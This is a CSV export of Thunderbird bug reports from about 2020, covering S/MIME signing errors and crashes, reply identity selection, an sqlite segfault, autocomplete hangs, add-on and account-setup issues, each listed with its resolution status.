Issue id,Summary,Status,Priority,Resolution,Description
1611074,s/mime certificate can not be found. Not a dup of bug 531073,RESOLVED,--,INVALID,"Since 68.4. I have been getting this message Unable to save your message as a draft. You specified that this message should be digitally signed, but the application either failed to find the signing certificate specified in your Mail & Newsgroup Account Settings, or the certificate has expired. I had not changed the certificate for almost a year, but upon checking it is valid until Sunday, February 23, 2020 Issued by Common name (ca) Actalis Client Authentication CA G1 Organization (o) Actalis S.p.A./03358520967 Organizational Unit (ou) <Not Part Of Certificate> The fact there is an error is bad enough, but having the write window steal focus from not only Thunderbird, but whatever program has focus, to give me this message every time it tries to save a draft is infuriating. Between that and the system not remembering the SSL certificate offered to Yahoo and Freenode I am getting quite frustrated."
1611105,TB crashes during opening s/mime signed mail from mailman mailinglist,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Symphtom: ========== Forward a S/MIME signed mail to a mailman mailinglist AND signe it with S/MIME again and send the forwarded mail as attachment. Now open the mail and Thunderbird crashes. I don't know if this problem causes other security risks. Unless you have checked this I would mark this problem as harmful security problem. Feel free to ""unckeck"" this and open this bug for world access/read. Affected TB versions round about above v60. TB crashes on Linux and Windows, too. Other architectures not tested. We have tested the Horde Webgroupware and Thunderbird as sending/composing MUA but makes no different. Fast test to reproduce: ==================== Open the attached eml file. :-/ Workarounds: ============= 1st: Do not signe the fwd mail to the list OR 2nd: Do not send the fwd mail as attachment Actual results: TB crashes during opening the mail. Expected results: TB should show/open the mail and not crash... (:"
1611114,Non-default identity used for reply to email addressed to multiple identities,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Email account with multiple identities - default@somedomain.com (default identity) - other@otherdomain.com Send email to both addresses, with non-default listed first... To: <other@otherdomain.com>, <default@somedomain.com> Reply to email in Thunderbird Actual results: The From identity selected when replying is the first listed email address in the To field (i.e. other@otherdomain.com in this example) Expected results: When an email is sent to multiple identities, I would expect the default identity to be used when replying."
1611164,SIGSEGV with sqlite 3.31.0,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Update sqlite to v3.31.0. Actual results: Thunderbird crashes even using safe mode with the following backtrace: Thread 27 ""Cookie"" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7fffe5213700 (LWP 7431)] 0x00007ffff0a58f00 in ?? () from /usr/lib/thunderbird/libxul.so (gdb) bt #0 0x00007ffff0a58f00 in () at /usr/lib/thunderbird/libxul.so #1 0x00007ffff0a52339 in () at /usr/lib/thunderbird/libxul.so #2 0x00007fffef082440 in sqlite3WalOpen () at /usr/lib/libsqlite3.so.0 #3 0x00007fffef041aa9 in () at /usr/lib/libsqlite3.so.0 #4 0x00007fffef044f35 in sqlite3PagerOpenWal () at /usr/lib/libsqlite3.so.0 #5 0x00007fffeefd742e in sqlite3BtreeBeginTrans () at /usr/lib/libsqlite3.so.0 #6 0x00007fffef04e547 in sqlite3InitOne () at /usr/lib/libsqlite3.so.0 #7 0x00007fffef04e6dd in sqlite3Init () at /usr/lib/libsqlite3.so.0 #8 0x00007fffef04e730 in sqlite3ReadSchema () at /usr/lib/libsqlite3.so.0 #9 0x00007fffef04c7b9 in sqlite3Pragma () at /usr/lib/libsqlite3.so.0 #10 0x00007fffef04734a in sqlite3Parser () at /usr/lib/libsqlite3.so.0 #11 0x00007fffef06679d in sqlite3RunParse"
1611192,Thunderbird Client cannot send mailing lists with spaces,RESOLVED,--,WORKSFORME,"Discovery: Through personal use. Steps to reproduce: 1. Create a mailing list 2. Name the mailing list with one or more spaces in its name 3. Try to send an email via the mailing list (CC or BCC) 4. The ""Send"" button is grayed out, thus a mail cannot be sent Thunderbird version: 68.3.0 (32-Bit)"
1611259,"becomes unresponsive, displays menus and window improperly, and/or OOM crashes after updating to 68.4.1",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Basic tasks such as hitting REPLY, attempting to attach a file, typing a medium length email Actual results: Program becomes unresponsive, displays menus and window improperly, and/or crashes completely. Accessibility: Active AccessibilityInProcClient: 0x400 AdapterDeviceID: 0x1616 AdapterDriverVersion: 20.19.15.4642 AdapterSubsysID: 381c17aa AdapterVendorID: 0x8086 Add-ons: %7B58D4392A-842E-11DE-B51A-C7B855D89593%7D:3.0.0beta5,wetransfer%40extensions.thunderbird.net:2.0.0,default-theme%40mozilla.org:1.0,google%40search.mozilla.org:1.0,amazondotcom%40search.mozilla.org:1.1,bing%40search.mozilla.org:1.0,ddg%40search.mozilla.org:1.0,twitter%40search.mozilla.org:1.0,wikipedia%40search.mozilla.org:1.0 AvailablePageFile: 10047356928 AvailablePhysicalMemory: 9074921472 AvailableVirtualMemory: 557772800 BIOS_Manufacturer: LENOVO BlockedDllList: BreakpadReserveAddress: 115998720 BreakpadReserveSize: 83886080 BuildID: 20200108224327 CPUMicrocodeVersion: 0x2b ContentSandboxCapable: 1 ContentSandboxLevel: 1 CrashTime: 1579810694 Email: max@anasuya"
1611312,Beta 73.0b1 address autocomplete delay when composing,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: When in Sending mode, while entering recipient address, Thunderbird Beta 73.0b1 begins hanging. Actual results: May hang from 10 seconds to one minute while trying to create message in Sending mode. After recovery, it may hang two to four times before message is ready to send. Expected results: No hanging should occur when entering address characters and when typing message. With previous versions of Thunderbird up to Version 68, there was never hanging. PC is W7-64, 2TB HHD and 32Gb RAM Cached RAM averages 20Gb."
1611349,"Empty Add-On Preferences in menu bar (workaround, use APPmenu) on Mac",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: MacOS Catalina 10.15.2 Open Thunderbird. Tools > Add-on Preferences menu has no content. Currently have three Extensions: Lightning, Send Later and SmartTemplate4 Actual results: No content Expected results: Should see preferences for each Add-on"
1611354,"When saving message as text, Thunderbird still adds .eml instead of .txt",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open Thunderbird. File > Save As > File Format > Text Files Save Actual results: Saved as .eml, which makes it harder to open with Textedit. Expected results: Save as .txt Previously reported and closed as Bug 13789291"
1611375,Thunderbird custom IMAP/POP/SMTP can't accept a port number which is longer than 3 digits,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried to register an email account. Actual results: Thunderbird couldn't accept the port number ""1143"" etc. Expected results: Thunderbird shouldn't limit the port number."
1611405,account setup should prefer standard protocols over exchange,RESOLVED,--,FIXED,If an exchange account type is detected via autodiscover.xml it will usually (always?) be the listed in the xml above the standard protocols. Therefore it will become the default in the config we use. This is clearly incorrect. If standard protocols are listed they should be preferred. In fact it was never the intention to even show exchange for that case.
1611488,Attached signed message not displayed in signed messages,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Send a signed message to yourself (S/MIME, X.509). Forward this message as attachment to yourself and sign the forwarded message again (S/MIME, X.509). As an alternative, attach any signed message (S/MIME, X.509) to a signed message. Actual results: The forwarded message shows the attached message headers, but not the mail content. The message source shows the content of the attached mail. This bug does not occur when the forwarded message is not signed. I let display attachements inline. I am on Windows 10, Thunderbird is of version 68.4.2 (32 Bit). I also have Engimail, but it is actually not used here. Expected results: The attached mail message should be displayed inline with headers and content."
1611489,Downloading Thunderbird AddOns am also getting virus,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Hello to all, Am getting a notice from McAfee everytime I download a new AddOn from the Extensions Manager with in Thunderbird 68.4 (64 bit). Thought you all might want to know this is going on. Actual results: As I am downloading and installing the Extension(s): Allow HTML Temp ReFwdFormatter Provider for Google Calendar *McAfee reports that a virus tagged along and was blocked, each one seems to be a different virus (although I could be the same as I was not watching all that closely). Expected results: These AddOns should have installed without any notification from McAfee."
1611562,"When restart Thunderbird, previously open message tabs don't reappear",RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: - Use setting to open messages in new tabs - Open messages - Close Thunderbird - Restart Thunderbird Actual results: The messages don't reappear. Expected results: The messages should reappear. This was happening until this week. This feature is one of Thunderbird's main selling points for me.
